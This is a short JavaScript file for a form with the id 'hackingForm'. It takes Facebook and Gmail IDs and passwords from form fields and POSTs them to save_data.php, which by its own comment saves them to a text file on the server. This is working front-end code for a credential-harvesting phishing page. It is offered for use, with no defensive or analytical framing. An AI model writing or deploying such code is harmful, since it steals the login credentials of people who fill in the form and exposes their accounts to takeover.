document.getElementById('hackingForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const facebookID = document.getElementById('facebookID').value;
    const facebookPassword = document.getElementById('facebookPassword').value;
    const gmailID = document.getElementById('gmailID').value;
    const gmailPassword = document.getElementById('gmailPassword').value;

    const data = `Facebook ID: ${facebookID}\nFacebook Password: ${facebookPassword}\nGmail ID: ${gmailID}\nGmail Password: ${gmailPassword}`;

    // Save the data to a text file on the server using PHP
    const formData = new FormData();
    formData.append('data', data);

    fetch('save_data.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.text())
    .then(data => {
        alert('Data saved successfully!');
    })
    .catch(error => {
        console.error('Error:', error);
    });
});